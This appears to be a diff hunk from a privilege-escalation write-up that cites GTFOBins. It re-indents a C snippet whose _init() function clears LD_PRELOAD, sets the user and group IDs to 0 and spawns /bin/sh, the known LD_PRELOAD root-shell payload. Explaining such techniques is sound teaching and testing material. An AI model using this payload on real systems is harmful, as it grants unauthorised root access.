@@ -190,10 +190,10 @@ As [GTFOBins](https://gtfobins.github.io/) states, `ping` won't allow us to brea
 #include <sys/types.h>
 #include <stdlib.h>
 void _init() {
-  unsetenv("LD_PRELOAD");
-  setgid(0);
-  setuid(0);
-  system("/bin/sh");
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
 }
 ```
 
